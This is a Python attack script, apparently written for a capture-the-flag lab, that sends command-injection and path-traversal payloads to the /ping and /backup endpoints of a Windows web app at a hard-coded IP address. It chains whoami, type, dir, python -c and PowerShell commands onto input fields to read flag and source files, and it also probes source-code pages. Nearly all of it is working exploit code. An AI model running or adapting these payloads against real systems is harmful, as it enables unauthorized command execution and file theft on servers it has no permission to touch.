import requests
import re
import os
import time

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("深度测试Ping命令执行（根据提示）")
print("="*70)

# 根据提示，用户输入被拼进了系统命令
# 尝试各种Windows命令执行绕过方式

ping_payloads = [
    # 基本IP格式测试
    ("127.0.0.1", "基本IP"),
    ("localhost", "localhost"),
    ("::1", "IPv6"),
    
    # 尝试在IP后添加命令（使用各种分隔符）
    ("127.0.0.1 & whoami", "&分隔符"),
    ("127.0.0.1 && whoami", "&&分隔符"),
    ("127.0.0.1 | whoami", "|分隔符"),
    ("127.0.0.1 || whoami", "||分隔符"),
    ("127.0.0.1; whoami", ";分隔符"),
    ("127.0.0.1\nwhoami", "换行符"),
    
    # 尝试使用引号
    ('127.0.0.1" & whoami', "双引号"),
    ("127.0.0.1' & whoami", "单引号"),
    
    # 尝试使用括号
    ("(127.0.0.1) & whoami", "括号"),
    
    # 尝试使用cmd
    ("127.0.0.1 & cmd /c whoami", "cmd /c"),
    ("127.0.0.1 & cmd.exe /c whoami", "cmd.exe /c"),
    
    # 尝试读取flag文件
    ("127.0.0.1 & type F:\\flag.txt", "读取F:\\flag.txt"),
    ("127.0.0.1 & type F:\\small peoject\\python-lab\\flag.txt", "读取完整路径"),
    ("127.0.0.1 & type flag.txt", "相对路径"),
    
    # 尝试使用more命令
    ("127.0.0.1 & more F:\\flag.txt", "more命令"),
    
    # 尝试使用dir命令查找flag
    ("127.0.0.1 & dir F:\\ /s /b | findstr flag", "查找flag文件"),
    ("127.0.0.1 & dir F:\\small peoject\\python-lab\\", "列出目录"),
    
    # 尝试使用Python
    ("127.0.0.1 & python -c \"print('test')\"", "Python测试"),
    ("127.0.0.1 & python -c \"import os;print(open('F:\\flag.txt').read())\"", "Python读取"),
    
    # 尝试使用powershell
    ("127.0.0.1 & powershell -c \"Get-Content F:\\flag.txt\"", "PowerShell读取"),
]

for payload, desc in ping_payloads:
    try:
        r = session.get(f"{TARGET}/ping", params={"host": payload}, timeout=15)
        if r.status_code == 200:
            # 提取<pre>内容
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                
                # 分析响应内容
                if len(content) > 0:
                    print(f"\n>>> {desc}: {payload}")
                    
                    if "Blocked" in content:
                        print(f"状态: BLOCKED")
                    else:
                        # 显示完整响应
                        print(f"响应内容:\n{content}")
                        
                        # 搜索flag
                        flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                            exit(0)
                        
                        # 检查是否有命令执行成功的迹象
                        # Windows whoami命令会输出用户名，如 "desktop-user" 或 "administrator"
                        if any(keyword in content.lower() for keyword in ["administrator", "desktop", "user", "root", "system", "volume", "目录", "字节", "test", "python", "powershell"]):
                            if "ping" not in content.lower()[:200]:
                                print(f"⚠️ 可能存在命令执行!")
    except Exception as e:
        print(f"错误: {e}")
    
    time.sleep(0.5)

print("\n" + "="*70)
print("深度测试Backup命令执行（根据提示）")
print("="*70)

backup_payloads = [
    # 基本路径测试
    ("F:\\small peoject\\python-lab\\uploads", "基本路径"),
    
    # 尝试读取不同文件
    ("F:\\flag.txt", "读取F:\\flag.txt"),
    ("F:\\small peoject\\python-lab\\flag.txt", "读取完整路径"),
    ("F:\\small peoject\\python-lab\\app.py", "读取源码"),
    
    # 尝试路径遍历
    ("F:\\small peoject\\python-lab\\uploads\\..\\flag.txt", "路径遍历"),
    ("F:\\small peoject\\python-lab\\uploads\\..\\..\\flag.txt", "双重遍历"),
    
    # 尝试命令注入
    ("F:\\small peoject\\python-lab\\uploads & whoami", "&命令注入"),
    ("F:\\small peoject\\python-lab\\uploads && whoami", "&&命令注入"),
    ("F:\\small peoject\\python-lab\\uploads | whoami", "|命令注入"),
    ("F:\\small peoject\\python-lab\\uploads; whoami", ";命令注入"),
    
    # 尝试读取flag
    ("F:\\small peoject\\python-lab\\uploads & type F:\\flag.txt", "&读取flag"),
    ("F:\\small peoject\\python-lab\\uploads && type F:\\flag.txt", "&&读取flag"),
    ("F:\\small peoject\\python-lab\\uploads | type F:\\flag.txt", "|读取flag"),
    
    # 尝试使用cmd
    ("F:\\small peoject\\python-lab\\uploads & cmd /c type F:\\flag.txt", "cmd读取"),
]

for payload, desc in backup_payloads:
    try:
        r = session.get(f"{TARGET}/backup", params={"path": payload}, timeout=15)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                
                if len(content) > 0:
                    print(f"\n>>> {desc}: {payload}")
                    
                    if "Blocked" in content:
                        print(f"状态: BLOCKED")
                    else:
                        print(f"响应内容:\n{content[:500]}")
                        
                        # 搜索flag
                        flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                            exit(0)
                        
                        # 检查是否有命令执行成功的迹象
                        if any(keyword in content.lower() for keyword in ["administrator", "desktop", "user", "root", "system", "volume", "目录"]):
                            if "文件" not in content[:50]:
                                print(f"⚠️ 可能存在命令执行!")
    except:
        pass
    
    time.sleep(0.5)

print("\n" + "="*70)
print("尝试访问源码页面")
print("="*70)

source_pages = [
    "/ping-source",
    "/backup-source",
    "/search-source",
    "/login-source",
    "/include-source",
    "/message-source",
    "/dashboard-source",
]

for page in source_pages:
    try:
        r = session.get(f"{TARGET}{page}", timeout=15)
        if r.status_code == 200 and len(r.text) > 500:
            print(f"\n>>> {page}")
            print(f"状态码: {r.status_code}")
            
            # 搜索flag
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
            
            # 显示前500字符
            print(f"内容: {r.text[:500]}")
    except:
        pass

print("\n测试完成")